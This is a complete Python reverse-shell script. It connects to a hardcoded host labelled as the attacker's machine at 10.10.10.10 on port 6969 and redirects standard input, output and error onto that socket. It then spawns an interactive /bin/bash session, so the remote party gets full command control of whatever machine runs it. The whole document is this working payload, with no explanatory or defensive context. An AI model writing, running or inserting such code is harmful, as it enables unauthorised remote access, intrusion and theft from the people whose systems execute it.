import socket
import os
import pty
import subprocess
attacker_ip = '10.10.10.10'
attacker_port = 6969
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    # Connect to the attacker's machine
    s.connect((attacker_ip, attacker_port))
    s.send(b'Connection established\n')
except Exception as e:
    print(f"Connection failed: {e}")
    exit(1)
os.environ['TERM'] = 'xterm'
os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr
pty.spawn("/bin/bash")
s.close()
